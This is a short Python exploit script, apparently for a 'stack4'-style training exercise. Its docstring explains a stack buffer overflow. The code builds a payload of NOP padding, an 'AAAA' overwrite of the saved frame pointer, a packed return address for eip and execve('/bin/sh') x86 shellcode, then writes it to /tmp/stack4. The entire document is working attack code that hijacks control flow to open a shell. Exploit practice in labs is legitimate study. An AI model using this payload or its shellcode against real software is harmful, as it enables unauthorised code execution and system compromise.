'''
Before you craft the payload, figure out the number of characers. It takes to reach address location of of ebp. That would be your
buffer size.

Next 4 characters "AAAA" are added to overwrite the frame pointer (ebp).

Next address would belong to (eip) which is the address you want to jump to in order to change the code flow or execute arbitary
code.
'''


from __future__ import print_function

__author__="Madhav Bhatt"

import struct
import sys

buf_size = input("Enter Buffer Size : ")
return_address = input("Enter Location To jump to : ")
ebp = "AAAA"
eip = struct.pack("<I",return_address)
shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
sys.stdout = open("/tmp/stack4", "w")
print ("\x90"*buf_size + ebp + eip + shell_code)
